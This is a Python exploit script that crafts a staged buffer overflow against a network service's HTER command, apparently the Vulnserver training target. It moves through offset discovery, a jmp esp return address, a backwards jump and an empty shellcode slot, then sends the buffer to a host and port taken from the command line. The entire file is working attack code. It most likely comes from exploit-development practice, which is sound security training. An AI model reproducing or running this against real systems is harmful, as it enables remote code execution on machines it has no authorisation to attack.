#!/usr/bin/python

import socket
import os
import sys
from struct import pack
import time


host = sys.argv[1]
port = int(sys.argv[2])


def send_msg(buffer):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	print (s.recv(1024))
	s.send(buffer)
	print (s.recv(1024))
	s.close()


# 2 - Offsets
buffer =  b"HTER "
buffer += b"A"*2000
buffer += b"B"*100
buffer += b"C"*100
buffer += b"D"*100
buffer += b"E"*100
buffer += b"F"*100
buffer += b"G"*100
buffer += b"H"*100
buffer += b"I"*100
buffer += b"J"*100
buffer += b"K"*100

buffer =  b"HTER "
buffer += b"A"*2000
buffer += b"B"*10
buffer += b"C"*10
buffer += b"D"*10
buffer += b"E"*10
buffer += b"F"*10
buffer += b"G"*10
buffer += b"H"*10
buffer += b"I"*10
buffer += b"J"*10
buffer += b"K"*10
buffer += b"A"*1000

buffer =  b"HTER "
buffer += b"A"*2000
buffer += b"A"*40
buffer += b"BCDEFGHIJK"
buffer += b"A"*50
buffer += b"A"*1000

buffer =  b"HTER "
buffer += b"A"*2041
buffer += b"CDEFCDEF"
buffer += b"B"*1051


# 3 - Jmp ESP
buffer =  b"HTER "
buffer += b"A"*2041
# jmp_esp = pack("<i", 0x62501203) 
buffer += b"03125062" # bp 0x62501203; g
buffer += b"B"*1051

# 4 - Jump backwards
buffer =  b"HTER "
buffer += b"A"*2041
buffer += b"03125062" # bp 0x62501203; g
buffer += b"e9fbfbffff"
buffer += b"B"*1051

# 5 - Payload
payload = b"090909090"
payload += b"" # ADD PAYLOAD but delete all '\x'
buffer =  b"HTER "
buffer += payload
buffer += b"A"*(2041-len(payload))
buffer += b"03125062" # bp 0x62501203; g
buffer += b"e9fbfbffff"
buffer += b"B"*1051

send_msg(buffer)